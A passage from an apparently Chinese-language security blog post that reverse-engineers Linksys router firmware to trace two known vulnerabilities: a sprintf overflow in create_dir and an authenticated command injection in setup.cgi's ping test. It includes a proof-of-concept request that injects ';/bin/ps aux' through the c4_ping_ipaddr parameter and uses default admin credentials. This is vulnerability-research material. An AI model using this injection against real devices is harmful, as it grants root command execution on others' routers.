+<li>找到其在text中的数据交叉引用<code>Up    o    sub_40B080+11D8    la      $s2, mime_handlers</code>（call形式的为代码交叉引用）</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40B080</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v76 = &amp;mime_handlers;<span class="comment">// 结构体数组首地址</span></span><br><span class="line">  v77 = mime_handlers;<span class="comment">//结构体数组的第一个结构体的第一个成员</span></span><br><span class="line">  <span class="comment">// 从结构体数组中找到某结构体</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123; <span class="comment">//应该是字符串匹配功能，因此2参数都是字符串类型</span></span><br><span class="line">    <span class="comment">//可知结构体的第一个成员为字符串类型，由.data中结构体数组中也可知（见1</span></span><br><span class="line">    <span class="comment">//第一个为uri，因此dword_10009B6C也是（见1</span></span><br><span class="line">    result = match(v77, dword_10009B6C);</span><br><span class="line">    <span class="comment">// 若匹配到结果则退出循环</span></span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v76 += <span class="number">3</span>;<span class="comment">//指针+3，因此结构体的成员数为3</span></span><br><span class="line">    v77 = *v76;<span class="comment">//取第一个成员</span></span><br><span class="line">    <span class="comment">//若第一个成员为0则退出，表示结构体数组以0结尾（见2</span></span><br><span class="line">    <span class="keyword">if</span> ( !*v76 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1 结构体的第一个成员为字符串，而且应该是uri</span></span><br><span class="line">.data:<span class="number">10001500</span> mime_handlers:  .word aAsp_0             # DATA XREF: LOAD:<span class="number">00403938</span>↑o</span><br><span class="line">.data:<span class="number">10001500</span>                                          # sub_40B080+<span class="number">11</span>D8↑o ...</span><br><span class="line">.data:<span class="number">10001500</span>                                          # <span class="string">"**.asp"</span></span><br><span class="line">.data:<span class="number">10001504</span>                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">10001508</span>                 .word do_ej</span><br><span class="line">.data:<span class="number">1000150</span>C                 .word aSysinfoHtm        # <span class="string">"SysInfo.htm*"</span></span><br><span class="line">.data:<span class="number">10001510</span>                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">10001514</span>                 .word do_ej</span><br><span class="line">.data:<span class="number">10001518</span>                 .word aSysinfo1Htm       # <span class="string">"SysInfo1.htm*"</span></span><br><span class="line">.data:<span class="number">1000151</span>C                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">10001520</span>                 .word do_ej</span><br><span class="line">.data:<span class="number">10001524</span>                 .word aWlaninfoHtm       # <span class="string">"wlaninfo.htm*"</span></span><br><span class="line">.data:<span class="number">10001528</span>                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">1000152</span>C                 .word do_ej</span><br><span class="line"><span class="comment">// 2 结构体数组以0结尾</span></span><br><span class="line">.data:<span class="number">100015E4</span>                 .word aDiag              # <span class="string">"diag"</span></span><br><span class="line">.data:<span class="number">100015E8</span>                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">100015</span>EC                 .word do_ej</span><br><span class="line">.data:<span class="number">100015F</span>0                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">100015F</span>4                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">100015F</span>8                 .word <span class="number">0</span></span><br><span class="line">.data:<span class="number">100015F</span>C                 .globl apply_actions</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>继续分析sub_40B080函数，看取得v76之后</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40B080</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 判断是否存在</span></span><br><span class="line">  <span class="keyword">if</span> ( v76[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 先看session是否失效，可见此漏洞是需要认证的</span></span><br><span class="line">    v99 = (<span class="keyword">const</span> <span class="keyword">char</span> *)nvram_get(<span class="string">"close_session"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v99 || !<span class="built_in">strcmp</span>(v99, <span class="string">"1"</span>) || hnap_request == <span class="number">1</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v213 - <span class="number">4</span>) &gt;= <span class="number">3</span> )</span><br><span class="line">      <span class="comment">// 函数调用，可见第二个成员为函数指针</span></span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))v76[<span class="number">1</span>])(dword_10009B6C, conn_fp, v214, dword_10009BA8);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 判断是否存在</span></span><br><span class="line">  <span class="keyword">if</span> ( !v76[<span class="number">2</span>] )</span><br><span class="line">   <span class="keyword">return</span> sub_408D34();</span><br><span class="line">  v98 = (<span class="keyword">const</span> <span class="keyword">char</span> *)nvram_get(<span class="string">"close_session"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v98 || !<span class="built_in">strcmp</span>(v98, <span class="string">"1"</span>) || hnap_request == <span class="number">1</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v213 - <span class="number">4</span>) &gt;= <span class="number">3</span> || post != <span class="number">1</span> )</span><br><span class="line"> 	&#123;</span><br><span class="line">    <span class="comment">// 函数调用，可见第三个成员也为函数指针</span></span><br><span class="line">    <span class="comment">// 参数1为uri，参数2为socket连接</span></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">int</span>))v76[<span class="number">2</span>])(dword_10009B6C, conn_fp);</span><br><span class="line">    <span class="keyword">return</span> sub_408D34();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li>综上所述，结构体的第一个成员为字符串形式的uri，2和3皆是函数指针，选中数据右键，create structure from selection，创建如下结构体</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000 struc_mime_handlers struc  <span class="comment"># (sizeof=0xC, mappedto_24)</span></span><br><span class="line">00000000                                          <span class="comment"># XREF: .data:10001524/r</span></span><br><span class="line">00000000 aUri:           .word ?                  <span class="comment"># offset (00000000)</span></span><br><span class="line">00000004 func1:          .word ?</span><br><span class="line">00000008 func2:          .word ?                  <span class="comment"># offset (00000000)</span></span><br><span class="line">0000000C struc_mime_handlers ends</span><br></pre></td></tr></table></figure>
+<ol start="8">
+<li><p>sub_40B080重命名为my_handle_req，通过my_handle_req调用call_apply_cgi函数，而其又被main调用，mian被ftext中的_uClibc_main调用，而查看exports发现ftext为entry point。</p>
+</li>
+<li><p>因此漏洞函数create_dir的完整调用流程如下：</p>
+<ol>
+<li>入口点ftext</li>
+<li>_uClibc_main</li>
+<li>main</li>
+<li>my_handle_req</li>
+<li>call_apply_cgi（指针形式被调用</li>
+<li>apply_cgi</li>
+<li>gozila_cgi</li>
+<li>handle_gozila_action</li>
+<li>create_dir（指针形式被调用</li>
+</ol>
+</li>
+</ol>
+<h3 id="怎么发现"><a href="#怎么发现" class="headerlink" title="怎么发现"></a>怎么发现</h3><h4 id="py脚本初步过滤"><a href="#py脚本初步过滤" class="headerlink" title="py脚本初步过滤"></a>py脚本初步过滤</h4><ol>
+<li>触发漏洞的是create_dir中的字符串拼接函数sprintf，其原型 <code>sprintf(str, format, arg1, arg2...)</code> </li>
+<li>要产生漏洞，参数要满足：<ol>
+<li>str的空间大小是个定值（一般都满足），且不能太小（太小也没法利用）</li>
+<li>format中有%s，如果%d，则只取4个字节，而%s会一直取直到00（对应的用户可控的arg</li>
+<li>arg不能是定值，且用户能控制</li>
+</ol>
+</li>
+<li>编写ida脚本来进行初步过滤，然后人工看</li>
+<li>依据format过滤<ol>
+<li>对sprintf交叉引用，p类型的，共209（py脚本不限制%s个数，也是209，二者对应</li>
+<li>format中存在%s的，共113个</li>
+</ol>
+</li>
+<li>依据str过滤：情况有点多，不如直接看</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 几种对a0赋值的情况</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 调用前赋值、调用后赋值（流水线效应</span></span><br><span class="line"><span class="comment"># 1 先来自s0，又来自栈地址</span></span><br><span class="line">addiu   <span class="variable">$s0</span>, <span class="variable">$sp</span>, 0x70+var_28</span><br><span class="line">move    <span class="variable">$a0</span>, <span class="variable">$s0</span></span><br><span class="line">jalr    <span class="variable">$t9</span> ; sprintf</span><br><span class="line"><span class="comment"># 2 s7来自其他block，是跳过来的</span></span><br><span class="line">jalr    <span class="variable">$t9</span> ; sprintf</span><br><span class="line">move    <span class="variable">$a0</span>, <span class="variable">$s7</span></span><br><span class="line"><span class="comment"># 3 直接来自栈地址</span></span><br><span class="line">addiu   <span class="variable">$a0</span>, <span class="variable">$sp</span>, 0x1C0+var_188</span><br><span class="line">jalr    <span class="variable">$t9</span> ; sprintf</span><br><span class="line"><span class="comment"># 4 来自v0，而又来自其他函数返回值</span></span><br><span class="line">jalr    <span class="variable">$t9</span> ; strlen</span><br><span class="line">addu    <span class="variable">$a0</span>, <span class="variable">$s3</span>, <span class="variable">$v0</span></span><br><span class="line">jalr    <span class="variable">$t9</span> ; sprintf</span><br><span class="line"><span class="comment"># 5 待发现</span></span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li><p>依据arg过滤：</p>
+<ol>
+<li>具体有几个arg取决于format中%的个数（而非%s的个数），超过2个（还有2个是str和format），就通过栈传递而非寄存器了</li>
+<li>主要看%s对应的是不是写死的字符串，如果全部都是则排除</li>
+<li>关键点是看用户能够控制输入，脚本难以实现，故直接看吧</li>
+</ol>
+</li>
+<li><p>综上，通过format的过滤209变为了113，缩小了范围，而通过str和arg的过滤事倍功半，还是直接看</p>
+</li>
+</ol>
+<h4 id="先找用户能访问的"><a href="#先找用户能访问的" class="headerlink" title="先找用户能访问的"></a>先找用户能访问的</h4><ul>
+<li>找用户能访问的地方，再过滤一波</li>
+<li>需要分析整个二进制的架构，先积攒部分的经验，再看整体//here</li>
+</ul>
+<h2 id="02-CVE-2009-5157"><a href="#02-CVE-2009-5157" class="headerlink" title="02-CVE-2009-5157"></a>02-CVE-2009-5157</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.securityfocus.com/archive/1/503934</span></span><br><span class="line">When logged into web management console, it is possible to execute commands as root</span><br><span class="line"><span class="comment"># 需经过认证，命令注入</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>文件系统提取</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 固件下载（三方，没有V1.00.10，只有v1.00.19，凑活用</span></span><br><span class="line">https://sourceforge.net/projects/officiallinksysfirmware/</span><br><span class="line"><span class="comment"># 文件系统提取</span></span><br><span class="line">解压后，有很多其他工具，如buildroot</span><br><span class="line">有一个jffs2.bin，提取：https://github.com/sviehb/jefferson</span><br><span class="line">最终放弃此，找不到http程序，也没找到setup.cgi</span><br><span class="line"></span><br><span class="line"><span class="comment"># linksys官网找到以往版本下载</span></span><br><span class="line">https://www.linksys.com/gb/support-article?articleNum=208638</span><br></pre></td></tr></table></figure>
+<ul>
+<li>有多个setup.cgi，但最终都指向/usr/sbin/setup.cgi</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/squashfs-root$ find . -name <span class="string">"setup.cgi"</span></span><br><span class="line">./www.eng/setup.cgi</span><br><span class="line">./www.ar/setup.cgi</span><br><span class="line">./etc/setup.cgi</span><br><span class="line">./usr/sbin/setup.cgi</span><br><span class="line">./usr/etc/setup.cgi</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">/squashfs-root$ find . -name <span class="string">"setup.cgi"</span> | xargs ls -l</span><br><span class="line">lrwxrwxrwx 1 lxl lxl     18 Aug  1  2008 ./etc/setup.cgi -&gt; /tmp/etc/setup.cgi</span><br><span class="line">lrwxrwxrwx 1 lxl lxl     19 Aug  1  2008 ./usr/etc/setup.cgi -&gt; /usr/sbin/setup.cgi</span><br><span class="line">-rwxr-xr-x 1 lxl lxl 264372 Aug  1  2008 ./usr/sbin/setup.cgi</span><br><span class="line">lrwxrwxrwx 1 lxl lxl     14 Aug  1  2008 ./www.ar/setup.cgi -&gt; /etc/setup.cgi</span><br><span class="line">lrwxrwxrwx 1 lxl lxl     14 Aug  1  2008 ./www.eng/setup.cgi -&gt; /etc/setup.cgi</span><br></pre></td></tr></table></figure>
+<h3 id="如何触发"><a href="#如何触发" class="headerlink" title="如何触发"></a>如何触发</h3><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setup.cgi后的参数可控，c4_ping_ipaddr是漏洞点</span></span><br><span class="line">GET /setup.cgi?ping_ipaddr1=1&amp;ping_ipaddr2=1&amp;ping_ipaddr3=1&amp;ping_ipaddr4=1&amp;p</span><br><span class="line">ing_size=60&amp;ping_number=1&amp;ping_interval=1000&amp;ping_timeout=5000&amp;start=Sta</span><br><span class="line">rt+Test&amp;todo=ping_test&amp;this_file=Diagnostics.htm&amp;next_file=Diagnostics.h</span><br><span class="line">tm&amp;c4_ping_ipaddr=1.1.1.1;/bin/ps aux&amp;message= HTTP/1.1</span><br><span class="line"><span class="comment"># 需经过认证</span></span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞函数sub-A95C"><a href="#漏洞函数sub-A95C" class="headerlink" title="漏洞函数sub_A95C"></a>漏洞函数sub_A95C</h4><ul>
+<li>漏洞函数sub_A95C（rename为my_vuln_func），sprintf拼接用户输入，随后system执行</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串”c4_ping_ipaddr“交叉引用找到</span></span><br><span class="line">int __fastcall my_vuln_func(int a1)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># 根据上下文可猜测出：a1为url字符串，而sub_26D9C可获取指定键的值并返回（rename为my_get_value</span></span><br><span class="line">  v8 = (const char *)my_get_value(a1, <span class="string">"c4_ping_ipaddr"</span>);</span><br><span class="line">	<span class="comment"># 字符串拼接到s</span></span><br><span class="line">  sprintf(s, <span class="string">"/usr/sbin/pingmultilang -s %s -c %s -i %d.%d -W %d.%d %s"</span>, v2, v3, v14, v15, v16, v9, v8);</span><br><span class="line">  <span class="comment"># 执行s命令字符串，用户可控输入</span></span><br><span class="line">  system(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="如何调用漏洞函数-1"><a href="#如何调用漏洞函数-1" class="headerlink" title="如何调用漏洞函数"></a>如何调用漏洞函数</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># my_func_vuln的xrefs，只找到data中的，是结构体数组，找到起首地址</span></span><br><span class="line">.data:0004A9EC off_4A9EC       DCD aSave               ; DATA XREF: my_call_vuln_func+14↑o</span><br><span class="line">.data:0004A9EC                                         ; my_call_vuln_func:loc_D61C↑r ...</span><br><span class="line">.data:0004A9EC                                         ; <span class="string">"save"</span></span><br><span class="line">.data:0004A9F0                 DCD sub_CA40</span><br><span class="line">...</span><br><span class="line">.data:0004AA1C                 DCD aPingTest           ; <span class="string">"ping_test"</span><span class="comment"># 字符串</span></span><br><span class="line">.data:0004AA20                 DCD my_vuln_func	<span class="comment"># 函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结构体数组首地址xrefs</span></span><br><span class="line">int __fastcall my_call_vuln_func(int a1, const char *a2)</span><br><span class="line">&#123;</span><br><span class="line">  my_get_value(a1, (int)<span class="string">"this_file"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = &amp;off_4A9EC; *i; i += 2 )<span class="comment"># 每次+2，即结构体2个成员</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !strcmp(a2, *i) ) <span class="comment"># 对比第一个成员和a2，即字符串</span></span><br><span class="line">      <span class="built_in">return</span> ((int (__fastcall *)(int))i[1])(a1);<span class="comment"># 调用i[1]，即第2个成员为函数，其参数为a1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># my_call_vuln_func的xrefs</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">   		<span class="comment"># poc中，todo=ping_test</span></span><br><span class="line">      v17 = (const char *)my_get_value(v15, (int)<span class="string">"todo"</span>);<span class="comment"># 推出v15为uri</span></span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">      &#123;</span><br><span class="line">        my_call_vuln_func(v15, v17);<span class="comment"># 传参：uri、“ping_test”</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>综上，完整流程<ol>
+<li>_start</li>
+<li>_uClibc_main</li>
+<li>main</li>
+<li>my_call_vuln_func</li>
+<li>my_vuln_func（指针形式被调用</li>
+</ol>
+</li>
+</ul>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
+<li>system+spirntf：命令注入</li>
+<li>sprintf：能造成溢出，为何不是缓冲区溢出呢？或许是my_get_value中做了大小的限制</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall my_vuln_func(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (const char *)my_get_value(a1, (int)<span class="string">"c4_ping_ipaddr"</span>);</span><br><span class="line">  sprintf(s, <span class="string">"/usr/sbin/pingmultilang -s %s -c %s -i %d.%d -W %d.%d %s"</span>, v2, v3, v14, v15, v16, v9, v8);</span><br><span class="line">  system(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="03-here"><a href="#03-here" class="headerlink" title="03-//here"></a>03-//here</h2><p>看到了Linksys WVBR0 安全漏洞</p>
+<p><a href="https://www.anquanke.com/vul（搜索linksys" target="_blank" rel="noopener">https://www.anquanke.com/vul（搜索linksys</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>21Guns
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://21guns.top/2021/08/26/iot/补丁对比技术实践-linksys/" title="补丁对比技术实践-linksys">http://21guns.top/2021/08/26/iot/补丁对比技术实践-linksys/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/路由器/" rel="tag"># 路由器</a>
+              <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/补丁对比/" rel="tag"># 补丁对比</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/21/iot/路由器中的逻辑漏洞/" rel="prev" title="路由器中的逻辑漏洞">
+      <i class="fa fa-chevron-left"></i> 路由器中的逻辑漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/27/iot/补丁对比技术实践-netgear/" rel="next" title="补丁对比技术实践-netgear">
+      补丁对比技术实践-netgear <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#00-补丁对比-linksys"><span class="nav-number">1.</span> <span class="nav-text">00-补丁对比-linksys</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#00-pre"><span class="nav-number">1.1.</span> <span class="nav-text">00-pre</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#00-暂搁置"><span class="nav-number">1.2.</span> <span class="nav-text">00-暂搁置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#01-CVE-2020-26561"><span class="nav-number">1.3.</span> <span class="nav-text">01-CVE-2020-26561</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#怎么触发"><span class="nav-number">1.3.1.</span> <span class="nav-text">怎么触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞函数create-dir"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">漏洞函数create_dir</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何调用漏洞函数"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">如何调用漏洞函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#完整流程"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">完整流程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#怎么发现"><span class="nav-number">1.3.2.</span> <span class="nav-text">怎么发现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#py脚本初步过滤"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">py脚本初步过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#先找用户能访问的"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">先找用户能访问的</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-CVE-2009-5157"><span class="nav-number">1.4.</span> <span class="nav-text">02-CVE-2009-5157</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#如何触发"><span class="nav-number">1.4.1.</span> <span class="nav-text">如何触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#poc"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">poc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞函数sub-A95C"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">漏洞函数sub_A95C</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何调用漏洞函数-1"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">如何调用漏洞函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">1.4.2.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-here"><span class="nav-number">1.5.</span> <span class="nav-text">03-//here</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">21Guns</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">164</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">71</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
